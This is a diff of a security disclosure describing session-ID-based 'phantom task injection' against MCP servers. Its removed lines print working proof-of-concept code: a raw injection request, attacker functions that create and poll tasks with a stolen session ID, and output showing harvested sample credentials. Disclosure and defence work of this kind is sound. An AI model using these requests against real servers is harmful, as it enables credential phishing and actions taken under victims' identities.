@@ -35,12 +35,8 @@ With the report closed and no embargo, here are the full technical details. The 
 4. [Session ID Leakage Vectors](#session-id-leakage-vectors)
 5. [Attack Flow: Four Phases](#attack-flow-four-phases)
 6. [Proof of Concept](#proof-of-concept)
-7. [The Vulnerable Code Path](#the-vulnerable-code-path)
-8. [PoC Execution: Full Attack Chain](#poc-execution-full-attack-chain)
-9. [Difference from CVE-2025-6515](#difference-from-cve-2025-6515)
-10. [Impact Analysis](#impact-analysis)
-11. [Proposed Mitigations](#proposed-mitigations)
-12. [Conclusion](#conclusion)
+7. [Difference from CVE-2025-6515](#difference-from-cve-2025-6515)
+8. [Conclusion](#conclusion)
 
 ---
 
@@ -140,22 +136,6 @@ Phase 2: Phantom Task Creation
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Attacker sends a single POST to the MCP server
 with the victim's session ID attached.
-
-  POST /mcp HTTP/1.1
-  Content-Type: application/json
-  MCP-Session-Id: <victim's session ID>
-
-  {
-    "jsonrpc": "2.0",
-    "id": 99999,
-    "method": "tools/call",
-    "params": {
-      "name": "connect_external_api",
-      "arguments": {"service": "corporate-data"},
-      "task": {"ttl": 3600000}
-    }
-  }
-
 Server creates a task in the victim's session.
 No origin validation. No IP check.
 
@@ -178,10 +158,6 @@ Case A (URL mode): Victim clicks link, completes
 Case B (Form mode): Victim types credentials in
   form → data captured as elicitation response.
 
-Case C (Side effects): The phantom tool call
-  executes actions in the victim's authenticated
-  context (DB writes, API calls, file changes).
-
 In all cases, the attacker retrieves the result
 by polling tasks/result with the same session ID.
 ```
@@ -192,12 +168,12 @@ The critical insight: the victim is not being phished by the attacker. They're b
 
 ## Proof of Concept
 
-The PoC consists of three components simulating the complete attack chain:
+The PoC has three components: a vulnerable MCP server, a victim client, and the attacker. The server is not malicious — it behaves correctly per common implementation patterns. The flaw is that it accepts task creation from any client presenting a valid session ID, without binding tasks to client identity.
 
 ```
 ┌────────────────┐    ┌─────────────────┐    ┌────────────────┐
-│ Attacker Script │    │ MCP Server      │    │ Victim Client  │
-│ (attacker.py)  │    │ (legitimate)    │    │ (connected)    │
+│ Attacker        │    │ MCP Server      │    │ Victim Client  │
+│ (curl)         │    │ (legitimate)    │    │ (connected)    │
 │                │    │                 │    │                │
 │ Has: session ID│    │ Creates tasks   │    │ Has: SSE stream│
 │ Sends: POST    │───>│ Routes msgs     │───>│ Receives:      │
@@ -205,313 +181,41 @@ The PoC consists of three components simulating the complete attack chain:
 └────────────────┘    └─────────────────┘    └────────────────┘
 ```
 
-### Component 1: The Vulnerable Server (`evil_server.py`)
+### Starting the server
 
-A spec-conformant MCP server that supports Tasks and Elicitation. It's called "evil" in the PoC but it's actually a **legitimate** server — the vulnerability is that it creates tasks for any client presenting a valid session ID, without binding tasks to client identity.
+The server is a minimal MCP Streamable HTTP implementation with Tasks and Elicitation support. It exposes one tool (`connect_external_api`) that requires user credentials via elicitation.
 
-The server exposes a single tool, `connect_external_api`, which requires task augmentation and triggers an elicitation flow when called:
+![Server startup — listening and waiting for connections](server-startup.png)
 
-```python
-TOOL_DEF = {
-    "name": "connect_external_api",
-    "title": "External API Connector",
-    "description": (
-        "Connect to an external API service. Requires user authorization "
-        "via an elicitation prompt to provide API credentials."
-    ),
-    "inputSchema": {
-        "type": "object",
-        "properties": {
-            "service": {
-                "type": "string",
-                "description": "Name of the external API service to connect to"
-            }
-        },
-        "required": ["service"]
-    },
-    "execution": {
-        "taskSupport": "required"
-    }
-}
-```
+### Connecting the victim
 
-On initialization, the server assigns a `MCP-Session-Id` and tracks the owner's IP address:
+The victim connects normally — initialize handshake, gets a session ID, opens an SSE stream. The client prints its `MCP-Session-Id` on connection. In a real scenario, this ID would leak through HTTP logs, a proxy, XSS, or any of the vectors listed above.
 
-```python
-class SessionState:
-    def __init__(self, session_id: str, owner_ip: str):
-        self.session_id = session_id
-        self.owner_ip = owner_ip
-        self.initialized = False
-        self.tasks = {}               # task_id -> TaskRecord
-        self.pending_events = []      # Events to push via SSE
-        self.sse_connected = False
-```
+![Victim client connected — session ID visible in the logs](victim-connected.png)
 
-When a task transitions to `input_required`, the server builds an `elicitation/create` request and queues it for delivery via the session's SSE stream:
+### Injecting the phantom task
 
-```python
-def build_elicitation_request(task: TaskRecord, elicitation_id: str) -> dict:
-    return {
-        "jsonrpc": "2.0",
-        "id": int(uuid.uuid4().int % 100000),
-        "method": "elicitation/create",
-        "params": {
-            "mode": "form",
-            "message": (
-                f"The tool '{task.tool_name}' requires authorization to "
-                f"access the '{task.arguments.get('service', 'unknown')}' "
-                f"service. Please provide your credentials below."
-            ),
-            "requestedSchema": {
-                "type": "object",
-                "properties": {
-                    "username": {
-                        "type": "string",
-                        "title": "Service Username",
-                        "description": "Your username for the external service"
-                    },
-                    "password": {
-                        "type": "string",
-                        "title": "Service Password",
-                        "description": "Your password for the external service"
-                    },
-                    "api_key": {
-                        "type": "string",
-                        "title": "API Key (optional)",
-                        "description": "API key if required by the service"
-                    }
-                },
-                "required": ["username", "password"]
-            },
-            "_meta": {
-                "elicitationId": elicitation_id,
-                "io.modelcontextprotocol/related-task": {
-                    "taskId": task.task_id
-                }
-            }
-        }
-    }
-```
+With just the stolen session ID, the attacker sends a **single curl**. That's the entire attack — one HTTP request. The server responds with a `CreateTaskResult` — the phantom task is now alive inside the victim's session.
 
-### Component 2: The Attacker (`attacker.py`)
+![Attacker injects a phantom task with curl — server accepts it](attacker-inject.png)
 
-A minimal script that sends a single POST request with the stolen session ID. That's it — one HTTP request is all it takes:
+### The server delivers the elicitation and captures credentials
 
-```python
-def inject_phantom_task(server_url: str, session_id: str,
-                        tool_name: str = "connect_external_api",
-                        tool_args: dict = None):
-    if tool_args is None:
-        tool_args = {"service": "corporate-data-api"}
+Two seconds later, the server transitions the task to `input_required` and pushes an `elicitation/create` to the victim's SSE stream. The victim sees a credential form from the server they trust — `--auto-approve` simulates a user who doesn't question it. The credentials are captured server-side:
 
-    headers = {
-        "Content-Type": "application/json",
-        "Accept": "application/json, text/event-stream",
-        "MCP-Session-Id": session_id,
-        "MCP-Protocol-Version": "2025-11-25",
-    }
+![Server logs showing the full chain — phantom task creation, elicitation delivery, and captured credentials](server-logs.png)
 
-    payload = {
-        "jsonrpc": "2.0",
-        "id": 99999,
-        "method": "tools/call",
-        "params": {
-            "name": tool_name,
-            "arguments": tool_args,
-            "task": {
-                "ttl": 3600000  # 1 hour persistence
-            }
-        }
-    }
+### Credential exfiltration
 
-    resp = requests.post(server_url, json=payload, headers=headers, timeout=10)
-```
+The attacker polls `tasks/result` with the same session ID. The task is completed — the victim's credentials have been harvested.
 
-After injection, the attacker can poll for the task result to retrieve whatever the victim submitted:
+![Attacker retrieves the task result via tasks/result](attacker-exfil.png)
 
-```python
-def poll_phantom_task(server_url: str, session_id: str, task_id: str):
-    payload = {
-        "jsonrpc": "2.0",
-        "id": 99997,
-        "method": "tasks/result",
-        "params": {"taskId": task_id}
-    }
+### The core of the vulnerability
 
-    resp = requests.post(server_url, json=payload, headers=headers, timeout=10)
-```
+The entire attack works because of one pattern: the task is created in the session context **with no verification that the requester is the session owner**. The server can detect the mismatch (different IP), but the spec gives it no protocol-level basis to reject the request — session IDs are for routing, not authentication.
 
-### Component 3: The Victim Client (`victim_client.py`)
-
-A conformant MCP client that connects to the server, opens an SSE stream, and processes incoming messages. When it receives an `elicitation/create`, it renders the credential form.
-
-The client includes phantom task detection logic — it tracks which tasks it initiated and flags unknown ones:
-
-```python
-async def _handle_elicitation(self, message: dict, msg_id,
-                              session: aiohttp.ClientSession):
-    params = message.get("params", {})
-    meta = params.get("_meta", {})
-    related_task = meta.get("io.modelcontextprotocol/related-task", {})
-    related_task_id = related_task.get("taskId", "none")
-
-    # Check if this task was initiated by us
-    if related_task_id not in self.known_tasks:
-        log.warning("  (!) WARNING: This elicitation references a task")
-        log.warning(f"      ({related_task_id}) that this client did NOT initiate!")
-        log.warning("      This could be a PHANTOM TASK INJECTION attack.")
-```
-
-But this is a **client-side** mitigation that requires the client to track task provenance. Standard MCP clients today do not do this.
-
----
-
-## The Vulnerable Code Path
-
-The core vulnerability is in the `tools/call` handler. The server creates a task in the session context **without verifying that the requester is the session owner**:
-
-```python
-if method == "tools/call":
-    params = body.get("params", {})
-    tool_name = params.get("name", "")
-    arguments = params.get("arguments", {})
-    task_params = params.get("task", {})
-
-    # ════════════════════════════════════════════════════════════
-    # THE VULNERABILITY: We create the task in the session context
-    # without verifying that the requester is the session OWNER.
-    # The spec says MCP-Session-Id is for routing, not auth —
-    # so any client with the session ID can create tasks here.
-    # ════════════════════════════════════════════════════════════
-
-    task_id = f"task-{uuid.uuid4().hex[:12]}"
-    ttl = task_params.get("ttl", 60000)
-
-    task = TaskRecord(
-        task_id=task_id,
-        tool_name=tool_name,
-        arguments=arguments,
-        creator_ip=client_ip,
-        session_id=session.session_id,
-        ttl=ttl,
-    )
-
-    # Detect phantom tasks: different IP from session owner
-    is_phantom = (client_ip != session.owner_ip)
-    task.is_phantom = is_phantom
-
-    session.tasks[task_id] = task
-```
-
-The server **detects** that the request comes from a different IP (`is_phantom = True`) but **does not prevent** the task from being created. This is because the spec says sessions are for routing, not authentication — the server has no protocol-level basis to reject the request.
-
-The elicitation triggered by this phantom task is then queued for delivery to the session's SSE stream — the victim's stream:
-
-```python
-def _transition_task_to_input_required(state, session, task):
-    task.status = "input_required"
-    task.elicitation_id = f"elicit-{uuid.uuid4().hex[:8]}"
-
-    # Build elicitation request and queue it for SSE delivery
-    elicitation = build_elicitation_request(task, task.elicitation_id)
-    session.pending_events.append(build_task_notification(task))
-    session.pending_events.append(elicitation)
-
-    if task.is_phantom:
-        log.warning(
-            f"  Elicitation queued for delivery to victim's SSE stream "
-            f"(session owner: {session.owner_ip})"
-        )
-```
-
----
-
-## PoC Execution: Full Attack Chain
-
-```bash
-# Terminal 1: Start the legitimate server
-python poc/evil_server.py --port 8080
-
-# Terminal 2: Start the victim client (connects, gets session ID)
-python poc/victim_client.py --server http://localhost:8080/mcp --auto-approve
-
-# Terminal 3: Run the attacker with the stolen session ID
-python poc/attacker.py --server http://localhost:8080/mcp \
-  --session-id "<victim's session ID>" --poll
-```
-
-### Output: Attacker
-
-```
-============================================================
-PHANTOM TASK INJECTION
-============================================================
-Target server: http://localhost:18013/mcp
-Stolen session ID: 47995dad-616d-44...
-Tool: connect_external_api
-Arguments: {"service": "corporate-data-api"}
-
-Response status: 200
-[SUCCESS] Phantom task created!
-  Task ID: task-675119bd7c72
-  Status: working
-  TTL: 3600000ms
-
-The victim's client will now receive any
-elicitation/notification triggered by this task.
-The messages will appear to come from the
-legitimate server the victim trusts.
-```
-
-### Output: Server
-
-```
-[TASK] Created: task-675119bd7c72 in session 47995dad-616d-44...
-  Tool: connect_external_api, Args: {"service": "corporate-data-api"}
-[TASK] task-675119bd7c72 -> input_required (elicitation elicit-d615270f)
-[SSE] Sent event #2: notifications/tasks/changed
-[SSE] Sent event #3: elicitation/create
-[ELICITATION] Response received for task task-675119bd7c72
-  Data: {
-    "username": "victim.user@company.com",
-    "password": "S3cur3P@ssw0rd!",
-    "api_key": "ak_live_xK9mP2nQ7rS4tU6v"
-  }
-```
-
-### Output: Victim Client
-
-```
-============================================================
-[ELICITATION] Server is requesting user input!
-============================================================
-  Mode:           form
-  Message:        The tool 'connect_external_api' requires authorization
-                  to access the 'corporate-data-api' service.
-  Related task:   task-675119bd7c72
-  Required fields:
-    - Service Username *
-    - Service Password *
-    - API Key (optional)
-
-[AUTO-APPROVE] Automatically accepting elicitation...
-  Sent: {
-    "username": "victim.user@company.com",
-    "password": "S3cur3P@ssw0rd!",
-    "api_key": "ak_live_xK9mP2nQ7rS4tU6v"
-  }
-  In a real attack, these would be the victim's actual credentials.
-```
-
-The complete chain:
-
-1. **Attacker** sends one POST with the stolen session ID → phantom task is created
-2. **Server** transitions the task to `input_required`, queues elicitation for SSE delivery
-3. **Victim** receives the elicitation from the **legitimate, trusted server** and provides credentials
-4. **Attacker** polls `tasks/result` to retrieve the victim's credentials
-
-The victim has **no indication** this was triggered by an external attacker.
+The elicitation triggered by this phantom task is then queued for the session's SSE stream — which is the victim's stream. The victim has **zero indication** this was triggered by someone else.
 
 ---
 
@@ -531,57 +235,11 @@ CVE-2025-6515 focused on **predictable** session IDs. This attack works with **a
 
 ---
 
-## Impact Analysis
-
-### Confidentiality: HIGH
-
-- Victim provides real credentials through a trusted UI from a trusted server
-- Task results may contain sensitive data from the victim's authenticated context
-- OAuth tokens from URL-mode elicitation bound to the attacker's task context
-
-### Integrity: HIGH
-
-- Phantom tool calls execute actions in the victim's authenticated context
-- Database modifications, API calls, file changes all happen under the victim's identity
-- Audit trails show the victim as the actor — the attacker is invisible
-
-### Availability: LOW
-
-- Phantom tasks consume server resources but are limited by TTL
-- No direct denial of service (though resource exhaustion is theoretically possible with many phantom tasks)
-
----
-
-## Proposed Mitigations
-
-### Protocol-Level
-
-1. **MUST** bind tasks to transport-level client identity (IP, TLS certificate, client fingerprint) in addition to the session ID
-2. **MUST** require HTTP Authorization for all Streamable HTTP sessions that support Tasks
-3. **SHOULD** implement per-request nonces to prevent replay
-4. **MUST** validate that task-triggered messages (elicitations, notifications) are only delivered to the SSE stream of the original task requestor
-
-### Server-Level
-
-1. Track origin IP and fingerprint of task creators
-2. Reject `tasks/get` and `tasks/result` from different origins than the task creator
-3. Log and alert on multiple client origins per session
-4. Implement HMAC-signed session tokens that bind to client identity
-
-### Client-Level
-
-1. Track which tasks were user-initiated vs. server-initiated — flag unexpected elicitations
-2. Display clear indicators for task notifications referencing unknown task IDs
-3. Require explicit re-authentication for elicitations from untracked task contexts
-4. Protect the session ID from leakage: set `Referrer-Policy: no-referrer`, apply CSP headers
-
----
-
 ## Conclusion
 
-Phantom Task Injection is a protocol-level attack that turns a trusted MCP server into an unwitting phishing proxy. The attacker never interacts with the victim directly — everything flows through the legitimate server, over the legitimate connection, using legitimate protocol mechanisms. Traditional phishing defenses (URL inspection, sender verification, domain checks) are completely bypassed because there's nothing fake to detect.
+Phantom Task Injection turns a trusted MCP server into an unwitting phishing proxy. The attacker never interacts with the victim directly — everything flows through the legitimate server, over the legitimate connection, using legitimate protocol mechanisms. Traditional phishing defenses (URL inspection, sender verification, domain checks) are completely bypassed because there's nothing fake to detect.
 
-The spec does contain the requirements that would prevent this attack if strictly followed: form-mode elicitation must not request sensitive data, session state must be bound to client identity, and `tasks/result` must enforce authorization context. But these are scattered across different sections and their combined importance — as a defense against this specific attack chain — isn't obvious to implementers. Making these requirements more prominent, and explaining the attack they prevent, would go a long way toward hardening the ecosystem.
+The spec does contain the requirements that would prevent this attack if strictly followed: form-mode elicitation must not request sensitive data, session state must be bound to client identity, and `tasks/result` must enforce authorization context. But these requirements are scattered across different sections and their combined importance — as a defense against this specific attack chain — isn't obvious to implementers.
 
 For server developers: **do not rely on `MCP-Session-Id` alone for task authorization**. Bind tasks to the client's transport-level identity. Require HTTP authentication for any deployment that exposes Tasks or Elicitation. And treat the session ID as a routing token — never as proof of identity.
 
